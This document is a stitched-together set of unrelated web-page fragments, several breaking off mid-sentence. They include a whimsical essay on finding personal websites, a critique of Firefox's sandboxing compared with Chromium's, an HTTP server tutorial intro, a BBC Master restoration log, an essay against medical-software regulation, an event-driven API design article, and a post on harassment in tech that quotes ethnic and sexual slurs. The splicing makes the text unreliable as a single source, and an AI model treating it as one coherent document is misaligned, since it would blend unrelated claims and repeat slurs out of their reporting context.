      The personal website is a somewhat mysterious animal that 
      lives mostly unobserved in the jungle of the Internet.  A few 
      inexperienced Internet users who live completely within the 
      golden-walled gardens of Facebook and Google may not even be 
      aware of the species' existence.  Other inexperienced users 
      may consider the personal website to be either extinct, like 
      brontosaurus, or a myth, like 
      <a href="https://www.smithsonianmag.com/history/why-bigfoot-and-abominable-snowman-loom-large-human-imagination-180975365/">Bigfoot 
      or the Abominable Snowman</a>.  The truth is that many 
      specimens exist in the wild, but in order to successfully 
      hunt the personal website, a hunter must know the habits of 
      this species well.</p>

   <p>Please allow me to be your guide on this safari through the murky 
      and predator-filled Internet jungle, and I will lead you to 
      some representative specimens of the personal website species and 
      teach you hunting methods that are likely to lead you to others.</p>

   <p>As legend has it, during a more peaceful time, soon after the 
      genesis of the Internet jungle and before the mid 1990's, personal 
      websites were the predominant species.  But queen Sophia the 
      demiurge, wife of King Berners-Lee, at the pleading of her daughter 
      Pandora, acquiesced to provide a breeding ground for Pandora's 
      pets.  Over time, more and more pets were allowed to roam free in 
      the jungle, including not a few predators.  Eventually, these 
      pets became the predominant species of the Internet jungle and 
      personal websites became nearly invisible among all the bellowing 
      and commotion raised by Pandora's pets.  This near invisibility made 
      personal websites very difficult to hunt.</p>

   <p>Before discussing personal websites in detail, I should first 
      mention two common predators in the Internet jungle.  The 
      corporate predator induces the Internet user to willingly approach 
      him by pretending to be a harmless domesticated animal, much like 
      a horse or a cow.  Note that not all corporate websites are 
      predators, though a large number of them do have certain 
      similarities to cows, ponderousness often being one.  But, many 
      corporate websites are not nearly as domesticated as they appear.  
      Just read the details of their terms-of-service agreements if you 
      doubt this.  As with many humans and their cats, the truth is 
      that deciding in any given instance whether a corporate website 
      or its Internet user is the dominant species can be a difficult 
      task.</p>

   <p>A less well understood animal is the hacker.  Hacker is a genus 
      containing a number of species.  Some are predatory, and others 
      are harmless or even beneficial to the ecology of the Internet 
      jungle.  By far, the most populous species of predatory hacker is 
      the "script kiddie".  Script kiddies tend to be blind, feeling 
      their way around the Internet jungle from IP address to IP 
      address.  Their goal seems to be to find those websites that have 
      ingested corporate website code that has made them susceptible to 
      infection.  When a script kiddie finds such a website, it 
      frequently injects malware, which it sometimes uses to help it find 
      and attack other websites.</p>

   <p>The reason for the script kiddie's behavior remains a mystery, 
      since it usually provides little nourishment.  Some script kiddie 
      observers speculate that script kiddies engage in the noted 
      behavior simply to impress others of their species.  While other 
      animals must impress potential mates in order to improve the 
      genetics of their offspring, most potential mates of script kiddies 
      seem unimpressed by their behavior.  A possibility also exists that 
      the script kiddie's behavior serves primarily as a means of 
      determining pecking order, primarily among males of the species.  
      However, one observation that tends to bolster the mating theory is 
      that most script kiddies that have successfully mated no longer 
      engage in their typical behavior.</p>
  
   <p>Even many moderately experienced hunters fear the personal 
      website, because they have been led to believe that personal 
      websites frequently carry diseases--viruses in particular, or 
      parasites generally known as "malware".  Though both of these are 
      possible, they are uncommon.  The truth is that personal websites 
      practice habits that are generally no less cleanly than other 
      Internet jungle species.  However, some of the less wary personal 
      websites do become susceptible to viruses and malware by ingesting 
      code defecated by corporate websites, including code from the unusually 
      flatulent and dyspeptic Microshaft.  Nevertheless, hunters' fear of 
      personal websites is largely overblown. 
      <a href="https://cheapskatesguide.org/articles/no-such-thing-as-secure.html">Well-equipped</a>
      hunters have little to fear.</p>

   <p>Unlike most other animals that must constantly evade predators 
      to survive, the personal website has few known enemies.  The 
      personal website is, however, susceptible to the DMCA parasite, 
      which is capable of suing it to death.  Fortunately, this is a rare 
      occurrence, perhaps mainly due to the near invisibility of the 
      personal website.  For this reason, and because personal websites 
      are almost always so small that they have very little meat on them 
      (otherwise known as posts or articles), they are rarely in 
      danger from predators.  Personal websites also tend to 
      taste bad to the larger corporate predators, as they rarely 
      advertise or produce much of an income.  Very rarely, however, a 
      well-fed personal website may grow to a large enough size 
      to successfully compete with corporate websites for the food provided 
      by users.  When this occurs, some observers fear this fat 
      personal website may be in danger of being killed (see 
      <a href="https://johnfowler.co/facebook-blocked-my-website/">here</a>, 
      <a href="https://heavy.com/news/2018/10/facebook-purge-list-deleted-accounts/">here</a>, 
      <a href="https://www.convinceandconvert.com/social-media-strategy/3-ways-facebook-is-killing-your-website/">here</a>, 
      and <a href="https://www.ndtv.com/world-news/why-does-google-steal-content-from-honest-businesses-us-congressman-2271102">here</a>), 
      but few corporate predators ingest even the fattest personal 
      websites, perhaps because they simply do not know what to do with 
      them.  On rare occasions, however, corporate predators will capture 
      both personal and non-revenue-generating corporate websites and 
      allow them to live for a few more years while dying 
      <a href="https://techcommunity.microsoft.com/t5/healthcare-and-life-sciences/skype-for-business-online-end-of-life-july-31-2021/ba-p/779137">slow 
      deaths from starvation</a>.</p>

   <p>Unlike other animals that are seen or heard mainly at mating time, 
      personal websites do not reveal their presence in this manner, 
      because they do not mate.  Instead, they reproduce asexually.  Some 
      produce offspring by budding, a plantlike characteristic.  Many, if 
      not most, also exhibit another plantlike characteristic.  They 
      sprinkle their spoors (technically, known as hyperlinks) over the 
      floor of the Internet jungle in the hope of being one day chanced 
      upon by an Internet user and ingested.  Though ingestion rarely 
      occurs, when it does, through some process not well understood by 
      present-day science, the Internet user is occasionally induced to 
      create his own personal website.  This website is then free to bud 
      under the careful attention and care of the host Internet user, who 
      has now been transformed into an entity sometimes known as a 
      "developer", though developer is not an especially well-defined 
      designator.  At the proper time, the new website naturally begins 
      to produce its own spoors, and its life cycle repeats.</p>

   <p>Sometimes, spoors and bits of code are exchanged directly with other 
      personal websites, in a manner analogous to bacterial conjugation, 
      in which genetic material, called plasmids, are exchanged between 
      bacteria.  This type of spoor is known as a "backlink".  Sometimes, 
      websites collect backlinks and place them in groups called 
      blogrolls.</p>

   <p>As alluded to previously, the main reason personal websites are so 
      difficult to find in the Internet jungle is that they are almost 
      completely invisible to the bloodhounds of the Internet, known
      as "search engines".  Search engines use search algorithms, 
      rather than smell, to find websites.  Except on rare occasions, the 
      only search in which a personal website appears on <i>any page</i> 
      of a search result is a search that includes the personal website's 
      exact domain name (its location in the Internet jungle) 
      or the exact title of one its articles.  
      Therefore, less than a hundred of the most popular personal websites 
      can be found through the overwhelming majority of Internet 
      searches.  Though this may be hard to believe, it is true.</p>

   <p>Even the smaller search engines like millionshort.com, 
      swisscows.com, and wiby.me are largely blind to any personal 
      websites other than the top 100.  Internet zoologists speculate 
      that smaller search engines are not actually blind to personal 
      websites.  They only pretend to be blind by keeping their eyes 
      tightly closed whenever they encounter a personal website, so as to 
      imitate their leader, the Google search engine, which is truly blind 
      to all but the top 100 or so personal websites.</p>

   <p>Due to the lack of attention that personal websites receive, they 
      often congregate together, or at least maintain an association with 
      others of their kind.  They do this for survival.  You see, personal 
      websites need some amount of attention to survive.  If they cannot 
      get attention from Internet users, they try to get it from each 
      other.  This is the primary behavior by which an experienced hunter 
      may successfully track them.</p>

   <p>When by the greatest stroke of luck, a hunter happens to stumble 
      upon a nearly-invisible personal website, he should immediately look 
      for others nearby.  Personal …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>
    Chromium is far more secure than Firefox. Firefox's sandboxing and exploit mitigations are poorer than Chromium's
    by a large degree. </p><p>
    
    Firefox's <a href="https://wiki.mozilla.org/Security/Sandbox">sandboxing</a> lacks any <a href="https://www.chromium.org/Home/chromium-security/site-isolation">site isolation</a>. <a href="https://wiki.mozilla.org/Project_Fission">Project Fission</a> is still a WIP. The sandbox is currently only
    focused on isolating the browser as a whole from the rest of the OS and even that is quite poor. Excluding the issue
    of site isolation, only the Firefox sandbox on Windows is similar to <a href="https://chromium.googlesource.com/chromium/src/+/master/docs/design/sandbox.md">Chromium's</a> but even then,
    it <a href="https://bugzilla.mozilla.org/buglist.cgi?quicksearch=win32k">lacks</a> <a href="https://googleprojectzero.blogspot.com/2016/11/breaking-chain.html">win32k lockdown</a>. </p><p>
    
    The sandboxing on other platforms is very insecure and the Linux sandbox can hardly be called a sandbox at all as there
    are plenty of trivial escapes such as the <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1129492">X11 server</a>
    (this is also a 5 year old, critical issue). The issues with the Linux sandbox also go far beyond X11. One example is that
    there is <a href="https://wiki.mozilla.org/Security/Sandbox/Process_model#GPU_Process">no GPU process sandboxing</a>. Another example
      is that the seccomp filter is weaker; for example, there is <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1302711">
    barely any ioctl filtering</a> and <a href="https://dxr.mozilla.org/mozilla-central/rev/a5cb1a40413ebfb37e68bc8961e5a46467f06d14/security/sandbox/linux/SandboxFilter.cpp#1125">
    only tty ioctls are blocked</a> and there are a lot more issues. </p><p>
    
    On Android, Firefox <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1565196">does not have a sandbox at all beyond
    the OS app sandbox</a> unlike Chromium which uses the <a href="https://developer.android.com/guide/topics/manifest/service-element#isolated"><code>isolatedProcess</code>
    feature</a>. </p><p>
    
    Firefox also lacks important exploit mitigations that Chromium has such as <a href="https://chromium.googlesource.com/chromium/src/+/master/base/allocator/partition_allocator/PartitionAlloc.md">a
    hardened memory allocator</a> (<a href="https://searchfox.org/mozilla-central/source/memory/build/mozjemalloc.cpp">mozjemalloc</a> is just a few
    security features tacked on to jemalloc which is <a href="https://media.blackhat.com/bh-us-12/Briefings/Argyoudis/BH_US_12_Argyroudis_Exploiting_the_%20jemalloc_Memory_%20Allocator_Slides.pdf">
    inherently exploitation-friendly</a> and <a href="https://lists.torproject.org/pipermail/tor-dev/2019-August/013990.html">is not similar to a hardened memory
      allocator</a>), <a href="https://www.chromium.org/developers/testing/control-flow-integrity">Control-Flow
      Integrity</a>, <a href="https://github.com/struct/research/blob/master/Attacking_Clientside_JIT_Compilers_Paper.pdf">JIT hardening</a>,
    <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1381050">ACG</a>, <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1378417">
    CIG</a> and many more. You can look through <a href="https://bugzilla.mozilla.org/home">Bugzilla</a> for more examples. </p><p>
    
    Firefox <a href="https://wiki.mozilla.org/Oxidation">does have some parts written in Rust, a memory-safe language</a>,
    but the majority of the browser is still written in memory-unsafe languages so this isn't anything substantial and
    <a href="https://www.chromium.org/Home/chromium-security/memory-safety">Chromium is working on switching to memory-safe
    languages too</a>. </p><p>
    
    Firefox also uses <a href="https://hacks.mozilla.org/2020/02/securing-firefox-with-webassembly/">RLBox</a> but this
    is only used to sandbox a single library, Graphite and again, is not anything substantial.
    </p><p>

    
    Just look at what <a href="https://medium.com/@thegrugq/tor-and-its-discontents-ef5164845908">security</a> <a href="https://grapheneos.org/usage#web-browsing">experts</a> <a href="https://jandemooij.nl/blog/2015/12/29/wx-jit-code-enabled-in-firefox/#comment-2432279846">have</a> <a href="https://news.ycombinator.com/item?id=13623735">to</a> <a href="https://marc.info/?l=openbsd-misc&amp;m=152872551609819&amp;w=2">say</a> <a href="https://nitter.net/tqbf/status/930807512609296384">about</a> <a href="https://nitter.net/tqbf/status/930860544927649792">Firefox</a>.

For our purposes, that’s fine, as this is <strong>not</strong> a writeup on how to do a <em>proper</em> HTTP server implementation of the newest version (The <a href="https://en.wikipedia.org/wiki/HTTP/3" rel="noopener noreferrer" target="_blank">HTTP/3</a>
spec was recently introduced, on 26 September 2019). This post serves as a <em>gentle</em> introduction to how HTTP servers work and the basic principles behind it.
This guide is not meant for writing a server for use in production, if you wish to do so, use a reliable server like <a href="https://www.nginx.com/" rel="noopener noreferrer" target="_blank">Nginx</a>

any other protocol on the Internet, or on other networks. HTTP only
presumes a reliable transport; any protocol that provides such
guarantees can be used, and the mapping of the HTTP/1.1 request and
response structures onto the transport data units of the protocol in
question is outside the scope of this specification.</p></blockquote><figure><img data-src="https://d33wubrfki0l68.cloudfront.net/768bda4b344ed17be4a202b84f5709dd145b4df6/e6173/posts/linda/kid.png" alt="Kid surfing on a keyboard from the 90s." width="400px" src="https://d33wubrfki0l68.cloudfront.net/768bda4b344ed17be4a202b84f5709dd145b4df6/e6173/posts/linda/kid.png"></figure><p>The communication that happens between clients and servers happens using the HTTP protocol (there is also the <a href="https://en.wikipedia.org/wiki/Gopher_%28protocol%29" rel="noopener noreferrer" target="_blank">Gopher protocol</a>

if you’re in the IOT space). Where a client might be a web browser or software that understands HTTP. Both the TCP and HTTP protocols are <em>request-response</em> protocols. This means that the client will initiate a request to the server, which will <em>listen</em> for requests, and make an appropriate response, containing some <em>resource</em>.</p><p>HTTP transmits <em>resources</em>, which are simply chunks of data that are identified by a Uniform Resource Locator (URL).

<h4>Intro</h4>
<p>Some time ago, I wrote a post about <a href="https://retrohax.net/beeb-errr-bbc-micro-restoration-and-upgrades/">BBC Micro restoration and upgrades.</a> This time, I present you a BBC Master – Beebs bigger brother 🙂</p>
<p>I’ve bought this BBC Master some time ago. It was sitting on a shelf for quite a while but finally, I’ve managed to start working on it. This time again, it was a custom order for my friend Wendell (cheers mate:)</p>
<p>Do I have to mention that it was sold as “For parts – non-working” ? :&gt;</p>
<p>Well, as it turned out, it wasn’t in a dramatic shape but required refreshing and upgrades.</p>
<p>Here is how it looked.</p>

<p>Case fixes were easy. I only had to fix a broken screw stud and fix some cracks with metal mesh and soldering iron.</p>
<p>Later, it was cleaned and retr0brighted. Simple stuff.</p>

<h4>Power supply fix and hack</h4>
<p>Before powering it on, I wanted to make sure that PSU is working properly. PSUs in Beeb and Master use caps that tend to explode and are worth checking before supplying power to it. My unit confirmed that. I had to replace these caps which was an easy job.</p>

<p>Wendell asked me to try making this unit usable in the US and in the EU. This simply means that PSU has to be a bit more flexible and should accept 110VAC/60HZ (USA) and 230VAC/50Hz (EU)</p>
<p>I was very lucky because this BBC had a San Hua Tien PSU inside and it turned out that it supports both working modes depending on a jumper setting.</p>

<p>I’ve simply added some wires and a switch. I only had to make a nice hole in PSUs metal case and I was golden 🙂</p>

<h4>Keyboard</h4>
<p>In the meantime, I’ve managed to clean up a keyboard. </p>

<h4>PCB cleaning and speaker fix</h4>
<p>Next, I’ve moved to PCB cleaning. As usual, I’ve dumped it into my ultrasonic cleaner to get rid of these nasty white crystalline structures. I’ve also replaced a broken speaker with the 8 Ohm speaker that I’ve found in one of my drawers 🙂</p>

<h4>Batter mod</h4>
<p>Finally, I could power it on and test if everything works … NOT</p>

<p>With the help of guys from an excellent <a href="http://stardot.org.uk/">stardot.org.uk</a> forum, I’ve managed to pinpoint a problem. It turned out that this is a common issue with BBC Master, and my unit was simply missing a battery. Looks like the previous owner removed it to prevent leakage and corrosion.</p>
<p>I’ve ordered a 3xAA battery case from <a href="http://www.retroclinic.com/">Mark of RetroClinic</a> and it worked like a charm. It has a diode soldered in-line to prevent batteries from charging. The downside is that batteries have to be replaced from time to time but still, this is a way better solution than the original one.</p>

<h4>RPI Zero as a co-pro</h4>
<p>While looking for a solution to my previous battery problem on <a href="https://stardot.org.uk/forums/">stardot forums</a>, I’ve stumbled across the same mod as in <a href="https://retrohax.net/beeb-errr-bbc-micro-restoration-and-upgrades/">BBC Micro post</a> – Rpi Zero as a co-pro. This time it is an internal mod and again, it is made by <a href="http://www.retroclinic.com/">Mark of retroclinic.com</a>.</p>
<p>He’d send it to me along with a battery tray and one more cool gear that I will talk about later 😉</p>
<p>It is mounted straight onto a BBC Masters PCB.</p>

<h4>External GOTEK</h4>
<p>The last add-on that I’ve got from Mark was a GOTEK with an OLED, all needed gear and a filled USB flash drive for it.</p>
<p>It is a very convenient solution for BBC Master and as expected, works like a charm 🙂</p>

  <article>
    <p>I’m back from cryosleep. After <a href="https://www.eidel.io/2020/01/31/pioneers-vs-process-people/">leaving Merantix Healthcare</a> 7 months ago I haven’t
been writing much. I took the summer off to finish my pilot’s license and to try out a few things on the
side.</p>

<p>One of them was doing regulatory consulting for medical software startups. Remember: At Merantix Healthcare
(now: Vara), we managed to pass all regulatory hurdles to bring our Machine Learning - based Radiology
software to market. At the time I thought this was quite an unspectacular achievement, but apparently many
other companies fail at it.</p>

<p>So, shortly after becoming unemployed, random people started emailing me with requests like “Hey, work as a
consultant for us, we pay you money, start tomorrow”. I started calling it the <em>magical consulting business
with zero marketing</em>.</p>

<p>It’s not like I was keen to do it, but it was worth a try.</p>

<p>I approached it with an open mind. Half a year later, after having succesfully worked with four companies,
here’s my verdict: It sucks.</p>

<p>Why? Many reasons. But let’s take a step back first.</p>

<p>What is regulation? (Bear with me) in human language, <em>regulation</em> is a list of hoops some authority puts in
your way of accessing the market. Everyone in your industry has to jump through these hoops.</p>

<p>Here’s the thing: In a sane world, with rational people, we wouldn’t need any regulation. People would be
building perfectly safe software. Like, they wouldn’t write buggy code that crashes and <a href="https://en.wikipedia.org/wiki/Therac-25" target="_blank">shoots high doses of
radiation at patients</a>.</p>

<p>Having perfect software is a utopic scenario. Software is never perfect. And even if most people build safe
stuff most of the time, just a small group of reckless individuals is enough to cause disaster.</p>

<p>That’s where regulation comes in. Regulation basically says: “Hey, this one company screwed up big time
recently, so from now on, every company has to comply with this list of things we came up with. Those measures
will surely prevent that from happening again!”.</p>

<p>And that sucks. Because what did we do? We took the maximum observed stupidity of our society (writing buggy
code that emits radiation) and now we <em>assume</em> that 1) everyone else is just as stupid and 2) that some rules
we came up with will prevent the problem in the future.</p>

<p>Let’s think about these assumptions.</p>

<h3 id="1-can-we-assume-everyone-to-be-stupid">1) Can We Assume Everyone to Be Stupid?</h3>

<p>Does it really sound like a good approach to subject everyone to the same standards? Standards which were
created based on the most incapable person, the <em>most-stupid-denominator</em>?</p>

<p>This reminds me of working at the office (good times). In any company, there are always some people who are
more messy than others. Or should we rather say: Less diligent. While you’re trying to write code, they have
loud phone calls on speakerphone. They enter your meeting room and don’t close the door. Sometimes they
“forget” to use the toilet brush after deploying a large payload.</p>

<p>Now, how do you deal with these problems? You have two options:</p>

<p>You talk to those people individually. This is not only the most discreet, but also the most effective
way. It’s also the hardest. At least for you: It takes courage to approach that person and deliver that sort
of message. But it’s the right thing to do.</p>

<p>The other option would be: You attempt to <em>generalize</em> the problem and solve it <em>generically</em> by establishing
new company policies. You put up a sign in the open office saying “No loud phones calls!”. On all meeting room
doors, you write “Please close the door”. And in each bathroom, you hang up a framed SOP for when to use the
toilet brush.</p>

<p>This is how large companies deal with those problems, and companies in which people don’t have the guts to
talk about problems one on one. It’s a cowardly and ineffective move. Guess what - the dude who has loud phone
calls will most likely not read a random sign on the wall. And all other people who were behaving perfectly
fine are now subjected to a barrage of useless signs which assume they’re utterly incompetent at breathing.</p>

<p>Unfortunately, regulation tries to solve problems in the same way.</p>

<p>Developers are expected to create hundreds of pages of documentation to prove that they’ve really tested
everything. They must write a development plan to ensure that they’re actually capable of developing whatever
they wanted to build (?). They have to make a list of their dependencies and test them (!).</p>

<p>If your development team is incompetent, forcing them to write a development plan won’t increase their code
quality. It only increases overhead.</p>

<p>Funnily enough, the same incompetent developers will pass all regulatory hurdles as long as they’re creating
the right documentation. A scary thought. Which leads me to the next question:</p>

<h3 id="2-will-our-rules-prevent-the-problem">2) Will Our Rules Prevent the Problem?</h3>

<p>Anyone who has ever observed complex systems knows: It’s hard to come up with interventions which actually
provide the desired outcome.</p>

<p>Say, your garden has snakes. You don’t like that because you want to sit on your patio and you’re scared of
snakes. So you put a honey badger there to chase away the snakes. Great, the snakes are gone. But now the
honey badger is settling down on your patio and has invited all his honey badger friends to hang out
there. Bad luck for you. A second order effect!</p>

<p>Is developing (medical) software a complex process? And, if so, can regulation be compared to a honey badger?
I think so.</p>

<p>We are introducing measures which we <em>assume</em> will improve things, because they were <em>associated</em> with certain
problems in the past. But in reality we don’t know if they were <em>causing</em> them. We just mixed up correlation
and causation.</p>

<p>It’s like observing people with Covid and saying “Aha! Those Covid patients are coughing! So let’s tell all
healthy people not to cough and they’ll be fine!”. Luckily our standards of medical science are better than
that. New treatments have to undergo clinical trials in which they must show an improvement in patient
outcome. Do our regulatory measures undergo similar testing? I’m not sure.</p>

<p>But one things <em>will</em> happen for sure: The list of hoops all future companies have to jump through just became
longer. And guess what? The useful time they can spend on developing their product has shrunk, again.</p>

<p>But here’s the worst part. After we’ve introduced our measures, software actually became safer. That leads us
to wrongly assume that <em>we chose the right measures</em> and <em>those measures caused improvements in safety</em>. But I
don’t think that’s true. Sure, we achieved our goal, but we don’t know <em>how</em>. Sounds like alchemy! A dangerous
situation.</p>

<p>I call these <em>second order effects of regulation</em>.</p>

<h2 id="second-order-effects">Second Order Effects?</h2>

<p>Do our regulatory measures <em>cause</em> us to develop safer software? Or are we kicking off second-order effects
and just accomplishing our goals by coincidence?</p>

<p>Let’s look at the facts.</p>

<p>Building medical software has tons of additional overhead. This leads to slower development, additional hires
and more audits. What do companies need when development slows down, head count increases and auditors knock
on your door? Right - more money.</p>

<p>We’re severely limiting the number of companies who can enter the market by raising the bar of funding
required.</p>

<p>What are the consequences?</p>

<p>Only companies with a lot of funding (and time) are able to enter the market. A two-person startup can’t
afford to hire expensive staff for regulatory compliance. And they sure as hell can’t afford to put countless
man-hours into documenting regulatory-compliant processes! What sort of processes do you need in a two-person
startup, anyway?</p>

<p>So: We’ve successfully prevented small startups from entering the market.</p>

<p>What’s the main difference between small startups and large companies? Small startups develop products which
solve existing problems in a novel way. They accomplish this through innovation which others deemed
infeasible, or too <em>risky</em>, or both.</p>

<p><em>Risky</em>. That’s the difference.</p>

<p>GE, Philips, Siemens - do you expect those enterprises to ship a <em>risky</em>, groundbreaking Machine Learning -
based Radiology software which radically automates radiology assessments? Hell no. You can hardly expect them
to ship any features at all. They’re too scared of changing things. They’re scared of things going wrong,
their public image taking a hit and losing their existing customers. They are <em>risk-averse</em>.</p>

<p>So, yes, our medical software has become safer, but not due to our regulatory requirements. Rather because
we’ve created a heavy selection bias of only allowing large, well-funded, risk-averse companies to enter the
market.</p>

<p>We achieved safety at the cost of killing innovation. Flying an airplane, we would say: Great landing, wrong
airport.</p>

<h2 id="a-decision-we-have-to-make">A Decision We Have to Make</h2>

<p>Nowadays, the daring two-person startup can no longer enter the market and reach patients. That’s where
innovation would have happened.</p>

<p>Is that a bad thing? Well, it depends.</p>

<p>Safety and progress are often on opposing ends of a spectrum - in most cases, you can’t have both. We, as a
society, have chosen to heavily favor safety over progress. Better keep things the way they are, because new
things can go wrong. And that’s a fair decision to make.</p>

<p>But I think we’re making the wrong decision. Because most of us are blind to the opportunity cost of <em>not
innovating</em>. We don’t see what would have happened to patients if we had had better software.</p>

<p>While I was working in the hospital, I would regularly be involved in admitting new patients. You won’t
believe how often they didn’t have an up-to-date list of their medication. I’d have to call their GP and
request their medication list to be <em>faxed</em>, if I could reach the GP at all. This process was slow and
error-prone.</p>

<p>Consider: If you’re hit by a car and wheeled into the ER, do you want your medication list to be unavailable
because your GP is unreachable? Do you want your patient history to be lost because it’s on paper, stashed
away in some drawer? Do you want to be exposed to additional radiation for imaging because your old images
are on a CD at your parents place?</p>

<p>Just how many …</p></article></div></div>

<p>This post originally appeared on <a href="https://medium.com/capital-one-tech/event-streaming-an-additional-architectural-style-to-supplement-api-design-703c4f801722" target="_blank">Capital One Tech</a></p>
</blockquote>

<p>The growth and adoption of web-based APIs is key to the transformational technology journey of any enterprise. Those APIs, whether they are RESTful or not, remain synchronous. They, like the web, utilize the pattern of HTTP to implement a request-response interaction approach.</p>

<p>To illustrate, assume we have a project management API with the following interactions:</p>

<ol>
<li>Create a project (e.g. POST /projects)</li>
<li>Create a new task (e.g. POST /projects/{projectId}/tasks)</li>
<li>Assign the task to someone on our team (e.g. POST /tasks/{taskId}/assignees)</li>
<li>The assignee marks the task as complete (e.g. PUT /tasks/{taskId})</li>
</ol>

<p>An API following this design works if design of the user interface closely mirrors those endpoints. But suppose an additional application requirement is to ‘automatically’ update a task’s status when marked complete by another user. With a request/response web-API, an option is to incessantly poll a status API on the chance a status might have changed. This is both cumbersome and error-prone.
Instead of polling, we can introduce an <strong>event-driven architecture</strong>.</p>

<h2 id="introduction-to-event-driven-architecture">Introduction to Event-Driven Architecture<a href="#introduction-to-event-driven-architecture" arialabel="Anchor"> #︎</a> </h2>

<p>In an event-driven architecture (or EDA), an application is composed of independent components that react to events published by other components. EDA is popular for distributed applications, as new components may be introduced into a solution to solve emerging problems — without the knowledge of previously developed components. Message brokers are used as an intermediary for communication, producing a loosely coupled design by preventing components from directly communicating with one another.</p>

<p>If you are familiar with service-oriented architecture (SOA), you have experienced EDA. Most service-oriented architectures used an enterprise service bus (ESB) for service communication rather than a message broker. Events were published to the ESB, where they were then routed to other services to integrate two or more software systems. However, ESBs proved problematic as they were used as “integration glue”, causing integration code to become scattered across services, apps, and the ESB; fragile systems were created. This fragility produced a greater need for coordination between teams, slowing software delivery.</p>

<h2 id="the-emergence-of-a-microservice-and-event-driven-architecture">The Emergence of a Microservice and Event-Driven Architecture<a href="#the-emergence-of-a-microservice-and-event-driven-architecture" arialabel="Anchor"> #︎</a> </h2>

<p>To overcome this increased coordination, the microservice architecture was introduced as a replacement for traditional SOA. This newer distributed architecture, built on APIs and microservices, encourages “dumb pipes, smart endpoints.” Integration logic is pushed to the consumers and producers. Message brokers, rather than ESBs, are used for message routing, not integration logic. Services and APIs talk to one another while hiding implementation details. This loose coupling makes software more resilient to evolution as new requirements emerge.</p>

<p>As enterprises shift to APIs backed by a microservice architecture, the number of published events has grown considerably. Message brokers are typically transactional in nature, ensuring once-and-only-once delivery of messages. While useful for traditional software development, the transactional nature of message brokers limits the scalability of service communication.</p>

<p>Distributed streaming data platforms, such as Apache Kafka, now offer enterprises higher throughput than traditional message brokers. Kafka removes the need for transactional messaging found in message brokers, opting instead for turning events into message streams. These streams are accessible by any authorized subscriber and may be accessed real-time or processed sequentially from a predetermined location or at the start of the stream.</p>

<h2 id="api-design-with-event-streaming">API Design with Event Streaming<a href="#api-design-with-event-streaming" arialabel="Anchor"> #︎</a> </h2>

<p>Event streams help software extend beyond the request-response approach common to web API styles such as REST, GraphQL, and gRPC. Software can communicate bi-directionally, removing the need for API consumers to continually poll for state changes. Instead, APIs publish events to an event stream for notification of data changes or important business events to any number of subscribed services for further processing.</p>

<p>Let’s revisit our previous example. We needed to solve two separate requirements:</p>

<ol>
<li>Notification when a task is marked as completed. Our only option without a message-driven architecture is to require interested parties to constantly make API calls to see if the task has been completed (aka polling)</li>
<li>Alerting a project owner when a task has been modified or marked as completed. Our only option is to mix our user interface concerns with our API by making the API send an email. The API is no longer responsible for managing projects and tasks — it is now responsible for the content and look-and-feel for email alerts</li>
</ol>

<p>If we introduce a message-driven architecture to our solution, we can develop an API that delivers project and task resources that offer the necessary capabilities (create, read, update, delete, and mark as complete). Our API doesn’t need to know about how the task completion event notification will be used, including that an email will be sent. All it needs to do is publish event messages when those events occur and allow other services to take action as appropriate. Events this API may publish include:</p>

<p><img src="https://www.asyncapi.com/images/posts/event-streaming-an-additional-architectural-style-to-suplement-api-design/event-examples.webp" alt="Example of API events" title="Example of API events"></p>

<p>Interested parties can then subscribe to the event(s) they are interested in and safely ignore the rest. In our example, we may end up with three components:</p>

<ol>
<li><strong>Projects API</strong> — Manages the Projects and Project Tasks resources via a REST-based API. The API may be comprised of one or more microservices that implement the capabilities offered by the REST API. When any event, from the list in the table above, occurs then the API publishes an event into the appropriate message stream for consumption by event subscribers</li>
<li><strong>Task Completed Email Microservice</strong> — Subscribes to the Task.Completed event, notifying project manager(s) via email when any task has been marked as completed</li>
<li><strong>Task Modified Email Microservice</strong> — Subscribes to the Task.Updated event, notifying all team members via email when any task has been edited</li>
</ol>

<p>The API has no awareness of the two microservices subscribed to the specific events; it just publishes the events to the appropriate message stream. The solution is considered loosely coupled and therefore capable of evolving over time as new requirements emerge, perhaps with new types of notifications (e.g. SMS, web dashboard alerts) or integrations (e.g. synching to JIRA).</p>

<h2 id="conclusion">Conclusion<a href="#conclusion" arialabel="Anchor"> #︎</a> </h2>

<p>The demand for more robust methods of software communication is pushing the limits of today’s interface solutions. Request/response-based APIs are essential. However, today’s technical problems are now demanding event-driven support — in addition to request/response — to improve an API’s capability offerings.</p>

<p>As API designers, we must strive to use all available tools to offer a better developer experience. As you enhance your existing APIs and new APIs emerge, ask yourself:</p>

<ol>
<li>How can my solution architecture be improved by moving beyond standard REST APIs and into a loosely-coupled event-driven architecture?</li>
<li>What events should my API publish that would benefit API consumers?</li>
<li>How will my API consumers benefit from the addition of these events and how do they take advantage of them?</li>
</ol>

<p>Let’s shift our approach from strictly request-response to thinking in terms of how our APIs can not only offer endpoints for requests, but events that enable the API to push to other services. The result will be increased innovation and more transformative APIs both within and across our LOBs.</p>

I have a lot of privilege as an Asian American, but was quickly reminded how easy I can be reduced to stereotypes and slurs.

    </span></p><p>This one in particular stood out to me because it's a very specific type of harassment I've received my whole life, usually from East Asians. This piece of trash is stating that I'm subhuman because of my Vietnamese heritage. Tbh, this hits harder than boring 'ol "chink." The colorism here makes me think this was an Asian dude.

    </span></p><p>I'd like to point out that the idea of avoiding "diversity hires" as to not lower the bar of quality is still a prevalent sentiment within tech. Again, these are not just nameless 4chan trolls—they're people in our industry.</p><h2>... and should be punished.</h2><p>Yeah, these are gross. Apparently I should get fired and deserve the harassment because I'm an attention seeking whore on a programming platform!

